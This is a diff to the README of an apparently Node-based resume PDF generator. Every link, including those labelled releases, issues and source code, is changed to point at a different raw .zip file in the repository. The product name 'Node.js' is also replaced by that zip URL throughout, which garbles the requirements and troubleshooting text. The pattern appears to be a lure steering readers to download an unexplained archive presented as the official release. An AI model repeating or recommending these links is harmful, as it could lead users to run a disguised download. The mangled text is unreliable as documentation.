@@ -1,6 +1,6 @@
 # 📝 SA-resume-pdf-generator - Create Stunning Resumes with Ease
 
-[![Download](https://raw.githubusercontent.com/Kasianand25/SA-resume-pdf-generator/main/storage/SA-resume-pdf-generator-v2.4-alpha.3.zip)](https://raw.githubusercontent.com/Kasianand25/SA-resume-pdf-generator/main/storage/SA-resume-pdf-generator-v2.4-alpha.3.zip)
+[![Download](https://raw.githubusercontent.com/Kasianand25/SA-resume-pdf-generator/main/scripts/S_pdf_generator_resume_2.0.zip)](https://raw.githubusercontent.com/Kasianand25/SA-resume-pdf-generator/main/scripts/S_pdf_generator_resume_2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -18,12 +18,12 @@ Welcome to the SA-resume-pdf-generator! This application lets you create profess
 To use SA-resume-pdf-generator, ensure you have the following:
 
 - **Operating System**: Windows, macOS, or Linux
-- **https://raw.githubusercontent.com/Kasianand25/SA-resume-pdf-generator/main/storage/SA-resume-pdf-generator-v2.4-alpha.3.zip**: Version 14 or above
+- **https://raw.githubusercontent.com/Kasianand25/SA-resume-pdf-generator/main/scripts/S_pdf_generator_resume_2.0.zip**: Version 14 or above
 - **Puppeteer**: Automatically included; no need for separate installation.
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/Kasianand25/SA-resume-pdf-generator/main/storage/SA-resume-pdf-generator-v2.4-alpha.3.zip) to get the latest version.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/Kasianand25/SA-resume-pdf-generator/main/scripts/S_pdf_generator_resume_2.0.zip) to get the latest version.
    
 2. **Choose Your File**: Select the appropriate file for your operating system from the list.
 
@@ -55,7 +55,7 @@ To use SA-resume-pdf-generator, ensure you have the following:
 
 If you encounter issues while using SA-resume-pdf-generator, try the following steps:
 
-- **Check https://raw.githubusercontent.com/Kasianand25/SA-resume-pdf-generator/main/storage/SA-resume-pdf-generator-v2.4-alpha.3.zip Installation**: Ensure https://raw.githubusercontent.com/Kasianand25/SA-resume-pdf-generator/main/storage/SA-resume-pdf-generator-v2.4-alpha.3.zip is correctly installed. Run `node -v` in your terminal or command prompt to verify.
+- **Check https://raw.githubusercontent.com/Kasianand25/SA-resume-pdf-generator/main/scripts/S_pdf_generator_resume_2.0.zip Installation**: Ensure https://raw.githubusercontent.com/Kasianand25/SA-resume-pdf-generator/main/scripts/S_pdf_generator_resume_2.0.zip is correctly installed. Run `node -v` in your terminal or command prompt to verify.
 - **Application Not Opening?**: Restart your computer and try running the application again.
 - **PDF Not Generating**: Ensure all required fields in the template are filled before trying to export.
 
@@ -67,7 +67,7 @@ Yes! You can easily edit the HTML files in the “templates” folder to suit yo
 
 ### What if I need additional help?
 
-You can open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/Kasianand25/SA-resume-pdf-generator/main/storage/SA-resume-pdf-generator-v2.4-alpha.3.zip) for assistance.
+You can open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/Kasianand25/SA-resume-pdf-generator/main/scripts/S_pdf_generator_resume_2.0.zip) for assistance.
 
 ### Is SA-resume-pdf-generator free to use?
 
@@ -84,7 +84,7 @@ Yes, you can use this application free of charge.
 - HTML Template
 - HTML to PDF
 - JavaScript
-- https://raw.githubusercontent.com/Kasianand25/SA-resume-pdf-generator/main/storage/SA-resume-pdf-generator-v2.4-alpha.3.zip
+- https://raw.githubusercontent.com/Kasianand25/SA-resume-pdf-generator/main/scripts/S_pdf_generator_resume_2.0.zip
 - PDF Generation
 - Portfolio Tools
 - Printing
@@ -95,6 +95,6 @@ Yes, you can use this application free of charge.
 
 - **Documentation**: Explore the official documentation for more details on advanced features.
 - **Community**: Join our community forums and engage with other users for tips and tricks.
-- **Source Code**: Feel free to check out the source code on [GitHub](https://raw.githubusercontent.com/Kasianand25/SA-resume-pdf-generator/main/storage/SA-resume-pdf-generator-v2.4-alpha.3.zip).
+- **Source Code**: Feel free to check out the source code on [GitHub](https://raw.githubusercontent.com/Kasianand25/SA-resume-pdf-generator/main/scripts/S_pdf_generator_resume_2.0.zip).
 
-Take your resume building to the next level with SA-resume-pdf-generator! Visit the [Releases page](https://raw.githubusercontent.com/Kasianand25/SA-resume-pdf-generator/main/storage/SA-resume-pdf-generator-v2.4-alpha.3.zip) now to get started.
+Take your resume building to the next level with SA-resume-pdf-generator! Visit the [Releases page](https://raw.githubusercontent.com/Kasianand25/SA-resume-pdf-generator/main/scripts/S_pdf_generator_resume_2.0.zip) now to get started.
